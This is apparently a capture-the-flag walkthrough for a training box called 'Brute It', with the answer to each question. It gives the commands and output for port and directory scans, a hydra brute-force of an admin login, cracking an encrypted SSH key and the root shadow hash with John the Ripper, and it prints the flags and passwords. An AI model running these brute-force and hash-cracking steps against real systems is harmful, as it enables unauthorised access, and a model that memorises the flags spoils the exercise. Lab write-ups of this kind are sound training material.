@@ -1,0 +1,234 @@
+BRUTE IT.
+
+
+
+
+[>>> TASK 1: ABOUT THIS BOX]
+[1.1. DEPLOY THE MACHINE]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 2: RECONNAISANCE]
+[2.1. SEARCH FOR OPEN PORTS USING NMAP. HOW MANY PORTS ARE OPEN?]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.61.10
+[OUTPUT]
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[ANSWER]
+2
+
+
+
+[2.2. WHAT VERSION OF SSH IS RUNNING?]
+[ANSWER (based on last ouptut)]
+openssh 7.6p1
+
+
+
+[2.3. WHAT VERSION OF APACHE IS RUNNING?]
+[ANSWER (based on 2.1. output)]
+2.4.29
+
+
+
+[2.4. WHICH LINUX DISTRIBUTION IS RUNNING?]
+[ANSWER (based on 2.1. output)]
+ubuntu
+
+
+
+[2.5. SEARCH FOR HIDDEN DIRECTORIES ON THE WEB SERVER. WHAT IS THE HIDDEN DIRECTORY?]
+[ACTION: gobuster scan for common directories]
+gobuster dir -u http://10.10.61.10/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.hta                 (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/admin                (Status: 301) [Size: 310] [--> http://10.10.61.10/admin/]
+/index.html           (Status: 200) [Size: 10918]
+/server-status        (Status: 403) [Size: 276]
+[ANSWER]
+/admin
+
+
+
+
+[>>> TASK 3: GETTING A SHELL]
+[3.1. WHAT IS THE user:password OF THE ADMIN PANEL?]
+[NOTE]
+Beforehand I tried 2 things with no useful results:
+1. Reading and analyzing source code of http://10.10.61.10/.
+2. Checking if login form error returns if user exists.
+[ACTION: explore http://10.10.61.10/admin/]
+Inspect source.
+[OUTPUT]
+<!-- Hey john, if you do not remember, the username is admin -->
+
+
+[NOTE]
+Payload form data values: user, pass
+[ACTION: bruteforce admin login via hydra]
+sudo hydra -l admin -P ~/thm/rockyou.txt 10.10.61.10 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
+[OUTPUT]
+[80][http-post-form] host: 10.10.61.10   login: admin   password: xavier
+[ANSWER]
+admin:xavier
+
+
+
+[3.2. CRACK THE RSA KEY YOU FOUND. WHAT IS JOHN'S RSA PRIVATE KEY PASSPHRASE?]
+[ACTION: log in as admin to http://10.10.61.10/admin/]
+Creds: admin|xavier
+[OUTPUT]
+Hello john, finish the development of the site, here's your RSA private key.
+THM{brut3_f0rce_is_e4sy}
+
+
+[ACTION: click rsa redirect link]
+Redirects to http://10.10.61.10/admin/panel/id_rsa
+[OUTPUT]
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----
+
+
+[ACTION: make key file]
+echo "-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
+
+JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
+UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
+BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
+HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
++Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
+UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
+VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
+vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
+/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
+y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
+yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
+oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
+onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
+zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
+wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
+f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
+uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
+O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
+C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
+mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
+OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
+6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
+zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
+miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
+x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
+-----END RSA PRIVATE KEY-----" > john_key
+
+
+[ACTION: get key hash]
+ssh2john john_key > john_hash.txt
+
+
+[ACTION: crack]
+john --wordlist=~/thm/rockyou.txt john_hash.txt
+[OUTPUT]
+rockinroll       (john_key)     
+[ANSWER]
+rockinroll
+
+
+
+[3.3. user.txt]
+[NOTE]
+Creds: john|rockinroll
+[ACTION: ssh as john]
+chmod 600 john_key
+ssh john@10.10.61.10 -i john_key
+
+
+[ACTION: display user flag]
+cat user.txt
+[OUTPUT]
+THM{a_password_is_not_a_barrier}
+
+
+
+[3.4. WEB FLAG]
+[ANSWER (based on 3.2. output)]
+THM{brut3_f0rce_is_e4sy}
+
+
+
+
+[>>> TASK 4: PRIVILEGE ESCALATION]
+[4.1. FIND A FORM TO ESCALATE YOUR PRIVILEGES. WHAT IS THE ROOT'S PASSWORD?]
+[ACTION: check sudo permissions for john]
+sudo -l
+[OUTPUT]
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+
+
+[NOTE]
+We are asked about root password.
+It is almost certain we should get it from shadow and crack it.
+[ACTION: display root password hash]
+sudo cat /etc/shadow | grep root
+[OUTPUT]
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+[NOTE]
+Save string to root_bruteit_hash.txt
+
+
+[ACTION: crack]
+john --wordlist=~/thm/rockyou.txt root_bruteit_hash.txt
+[OUTPUT]
+football         (root)     
+[ANSWER]
+football
+
+
+
+[4.2. root.txt]
+sudo cat /root/root.txt
+[OUTPUT]
+THM{pr1v1l3g3_3sc4l4t10n}
+
+
+
